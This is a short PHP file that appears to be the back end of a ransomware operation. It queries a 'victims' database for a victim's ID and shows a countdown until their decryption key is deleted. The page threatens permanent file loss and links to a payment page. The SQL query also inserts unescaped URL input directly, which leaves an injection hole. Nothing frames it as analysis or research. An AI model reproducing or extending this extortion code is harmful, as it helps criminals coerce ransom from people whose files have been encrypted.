<?php

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$timestamp = time();
$dateTimestamp = new DateTime("@$timestamp");

$timestamp = $dateTimestamp->format('Y-m-d H:i:s');

if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
   $uniqueID = $_GET['unique_id'];

   $sql = "SELECT timediff(exp_time, \"$timestamp\") as time_left from target_list where unique_id = \"$uniqueID\"";
   $result = $conn->query($sql);

   if ($result->num_rows > 0) {
      while ($row = $result->fetch_assoc()) {
            if ($row['time_left'] < "00:00:01") {
               echo "<center><font color='red'>";
               echo "<h3>Time expired, your associated private key has been deleted and your files forever lost!</h3>";
               echo "</font></center>";
            } else {
               echo "<center><font color='red'>";
               echo "<h1>Time Remaining for $uniqueID: " . $row['time_left'] . "</h1><br /><br />";
               echo "<a href='/payment.php'>Pay here</a><br /><br />";
               echo "</font></center>";
               $page = $_SERVER['PHP_SELF'];
               $sec = "1";
               header("Refresh: $sec; url=$page");
            }
      }
   } else {
        echo "<br />Could not determine the time left!</br>";
   }  
}

$conn->close();

?>
